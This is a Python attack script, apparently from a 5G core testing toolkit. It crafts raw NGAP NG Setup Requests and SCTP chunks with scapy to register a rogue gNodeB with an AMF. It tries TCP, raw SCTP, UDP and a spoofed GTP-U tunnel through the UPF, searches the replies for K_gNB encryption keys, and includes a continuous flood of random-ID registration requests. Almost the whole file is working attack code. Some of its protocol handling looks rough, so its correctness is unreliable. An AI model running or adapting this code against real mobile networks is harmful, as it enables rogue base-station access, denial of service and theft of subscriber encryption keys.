#!/usr/bin/env python3
"""
Advanced gNodeB Registration Attack 
====================================
Properly formatted NGAP messages to complete rogue gNodeB registration
and extract encryption keys.

Only run when explicitly requested - this is the most aggressive attack.
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scapy.layers.inet import IP, UDP
from scapy.layers.sctp import SCTP
from scapy.packet import Raw
from scapy.sendrecv import send, sr1
from scapy.contrib.gtp import GTPHeader
import logging
import struct
import socket
import time
from core.config import DETECTED_COMPONENTS

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

NGAP_PORT = 38412

def craft_proper_ng_setup_request(gnb_id=0x000001, mcc="001", mnc="01", tac=1, gnb_name="5G-GIBBON"):
    plmn = bytes([
        int(mcc[1]) << 4 | int(mcc[0]),
        int(mnc[0]) << 4 | int(mcc[2]),
        int(mnc[2]) << 4 | int(mnc[1]) if len(mnc) == 3 else 0xF0 | int(mnc[1])
    ])
    
    gnb_id_bytes = struct.pack(">I", gnb_id)[1:]
    
    global_gnb_id_ie = bytes([
        0x00, 0x1B,
        0x00, 0x09,
        0x00,
        plmn[0], plmn[1], plmn[2],
        gnb_id_bytes[0], gnb_id_bytes[1], gnb_id_bytes[2],
        0x00, 0x00
    ])
    
    supported_ta_ie = bytes([
        0x00, 0x66,
        0x00, 0x0F,
        0x00,
        0x00, 0x01,
        (tac >> 16) & 0xFF, (tac >> 8) & 0xFF, tac & 0xFF,
        0x00, 0x00, 0x01,
        plmn[0], plmn[1], plmn[2],
        0x00, 0x00
    ])
    
    paging_drx_ie = bytes([
        0x00, 0x15,
        0x40, 0x01,
        0x40
    ])
    
    gnb_name_bytes = gnb_name.encode('utf-8')
    gnb_name_ie = bytes([
        0x00, 0x52,
        0x40, len(gnb_name_bytes) + 1,
        len(gnb_name_bytes)
    ]) + gnb_name_bytes
    
    num_ies = 4
    ie_data = global_gnb_id_ie + supported_ta_ie + paging_drx_ie + gnb_name_ie
    
    ie_container = bytes([
        0x00, 0x00, num_ies
    ]) + ie_data
    
    value_length = len(ie_container)
    
    ngap_pdu = bytes([
        0x00,
        0x15,
        0x00, value_length + 3,
    ]) + ie_container
    
    return ngap_pdu

def craft_sctp_init():
    init_tag = struct.pack(">I", 0x12345678)
    a_rwnd = struct.pack(">I", 65535)
    num_out = struct.pack(">H", 10)
    num_in = struct.pack(">H", 10)
    init_tsn = struct.pack(">I", 0x00000001)
    
    init_data = init_tag + a_rwnd + num_out + num_in + init_tsn
    
    chunk_type = 0x01
    chunk_flags = 0x00
    chunk_length = 4 + len(init_data)
    
    init_chunk = bytes([chunk_type, chunk_flags]) + struct.pack(">H", chunk_length) + init_data
    
    return init_chunk

def craft_sctp_data(stream_id, ssn, ppid, user_data):
    tsn = struct.pack(">I", 1)
    stream = struct.pack(">H", stream_id)
    sequence = struct.pack(">H", ssn)
    protocol = struct.pack(">I", ppid)
    
    data_header = tsn + stream + sequence + protocol
    
    chunk_type = 0x00
    chunk_flags = 0x03
    chunk_length = 16 + len(user_data)
    
    data_chunk = bytes([chunk_type, chunk_flags]) + struct.pack(">H", chunk_length) + data_header + user_data
    
    padding = (4 - (len(data_chunk) % 4)) % 4
    data_chunk += b'\x00' * padding
    
    return data_chunk

def run_advanced_registration(amf_ip=None, timeout=10):
    if amf_ip is None:
        amf_ip = DETECTED_COMPONENTS.get("amf_ip", "127.0.0.5")
    
    logger.info("=" * 60)
    logger.info("ADVANCED gNodeB REGISTRATION ATTACK")
    logger.info("=" * 60)
    logger.info(f"Target AMF: {amf_ip}")
    logger.info("")
    
    results = {
        "responses": [],
        "keys_found": [],
        "registration_success": False,
    }
    
    logger.info("[Phase 1] Crafting proper NG Setup Request...")
    ng_setup = craft_proper_ng_setup_request(
        gnb_id=0x123456,
        mcc="001",
        mnc="01",
        tac=1,
        gnb_name="5G-GIBBON-ROGUE"
    )
    logger.info(f"  NG Setup Request: {len(ng_setup)} bytes")
    logger.info(f"  Hex: {ng_setup.hex()[:80]}...")
    
    logger.info("\n[Phase 2] Direct SCTP connection to AMF...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((amf_ip, NGAP_PORT))
        
        if result == 0:
            logger.info(f"  ✓ TCP connection to {amf_ip}:{NGAP_PORT} successful!")
            sock.send(ng_setup)
            
            try:
                response = sock.recv(4096)
                if response:
                    logger.info(f"  ✓ Received {len(response)} bytes!")
                    results["responses"].append(response.hex())
            except socket.timeout:
                logger.info("  No response within timeout")
        else:
            logger.info(f"  TCP connection failed (error {result})")
        
        sock.close()
    except Exception as e:
        logger.debug(f"  TCP attempt failed: {e}")
    
    logger.info("\n[Phase 3] Raw SCTP via Scapy...")
    try:
        sctp_data = craft_sctp_data(0, 0, 60, ng_setup)
        
        pkt = IP(dst=amf_ip) / SCTP(sport=38412, dport=38412) / Raw(load=sctp_data)
        
        for attempt in range(5):
            ans = sr1(pkt, timeout=2, verbose=0)
            
            if ans:
                logger.info(f"  ✓ SCTP Response received (attempt {attempt + 1})!")
                
                if ans.haslayer(Raw):
                    payload = bytes(ans[Raw])
                    results["responses"].append(payload.hex())
                    
                    if b'\x00\x15' in payload or b'\x20\x15' in payload:
                        logger.info("  ✓✓ NGAP message detected in response!")
                        
                        if payload[0] == 0x20:
                            logger.info("  ✓✓✓ NG SETUP RESPONSE - REGISTRATION SUCCESSFUL!")
                            results["registration_success"] = True
                        elif payload[0] == 0x00:
                            logger.info("  ✗ NG SETUP FAILURE received")
                    
                    for i in range(len(payload) - 32):
                        if payload[i:i+2] == b'\x00\x5E':
                            potential_key = payload[i+2:i+34]
                            if len(potential_key) == 32:
                                logger.info(f"  🔑 POTENTIAL K_gNB FOUND!")
                                results["keys_found"].append({
                                    "type": "K_gNB",
                                    "value": potential_key.hex()
                                })
                break
            
            time.sleep(0.5)
        
        if not results["responses"]:
            logger.info("  No SCTP responses received")
    except Exception as e:
        logger.error(f"  SCTP attempt failed: {e}")
    
    logger.info("\n[Phase 4] UDP fallback to NGAP port...")
    try:
        pkt = IP(dst=amf_ip) / UDP(sport=38412, dport=38412) / Raw(load=ng_setup)
        
        ans = sr1(pkt, timeout=2, verbose=0)
        
        if ans:
            logger.info(f"  ✓ UDP Response received!")
            if ans.haslayer(Raw):
                results["responses"].append(bytes(ans[Raw]).hex())
        else:
            logger.info("  No UDP response")
    except Exception as e:
        logger.debug(f"  UDP attempt failed: {e}")
    
    logger.info("\n[Phase 5] GTP-U tunnel to AMF...")
    upf_ip = DETECTED_COMPONENTS.get("upf_ip", "127.0.0.7")
    
    try:
        inner = IP(src="10.0.0.8", dst=amf_ip) / SCTP(sport=38412, dport=38412) / Raw(load=ng_setup)
        
        outer = IP(src="10.0.0.8", dst=upf_ip) / UDP(sport=2152, dport=2152)
        outer = outer / GTPHeader(teid=1, gtp_type=255) / Raw(load=bytes(inner))
        
        send(outer, verbose=0)
        logger.info(f"  ✓ Sent tunneled NG Setup via UPF")
    except Exception as e:
        logger.debug(f"  Tunnel attempt failed: {e}")
    
    logger.info("\n" + "=" * 60)
    logger.info("RESULTS")
    logger.info("=" * 60)
    
    if results["registration_success"]:
        logger.info("✓✓✓ gNodeB REGISTRATION SUCCESSFUL!")
    else:
        logger.info("✗ Registration not confirmed")
    
    logger.info(f"Responses captured: {len(results['responses'])}")
    
    if results["keys_found"]:
        logger.info("\n🔑 KEYS EXTRACTED:")
        for key in results["keys_found"]:
            logger.info(f"  {key['type']}: {key['value']}")
    else:
        logger.info("No keys extracted")
    
    if results["responses"]:
        logger.info("\nResponse hex dumps:")
        for i, resp in enumerate(results["responses"][:3]):
            logger.info(f"  [{i}] {resp[:100]}...")
    
    return results

def run_continuous_registration_attack(amf_ip=None, duration=60, rate=10):
    if amf_ip is None:
        amf_ip = DETECTED_COMPONENTS.get("amf_ip", "127.0.0.5")
    
    logger.info("=" * 60)
    logger.info("CONTINUOUS REGISTRATION ATTACK")
    logger.info("=" * 60)
    logger.info(f"Target: {amf_ip}")
    logger.info(f"Duration: {duration}s, Rate: {rate} req/s")
    logger.info("")
    
    end_time = time.time() + duration
    sent = 0
    responses = 0
    
    while time.time() < end_time:
        gnb_id = struct.unpack(">I", b'\x00' + os.urandom(3))[0]
        ng_setup = craft_proper_ng_setup_request(gnb_id=gnb_id)
        
        pkt = IP(dst=amf_ip) / SCTP(sport=38412, dport=38412) / Raw(load=ng_setup)
        
        ans = sr1(pkt, timeout=0.1, verbose=0)
        sent += 1
        
        if ans:
            responses += 1
            if sent % 50 == 0:
                logger.info(f"  Progress: {sent} sent, {responses} responses")
        
        time.sleep(1.0 / rate)
    
    logger.info(f"\n✓ Attack complete: {sent} sent, {responses} responses")
    return {"sent": sent, "responses": responses}

if __name__ == "__main__":
    run_advanced_registration()

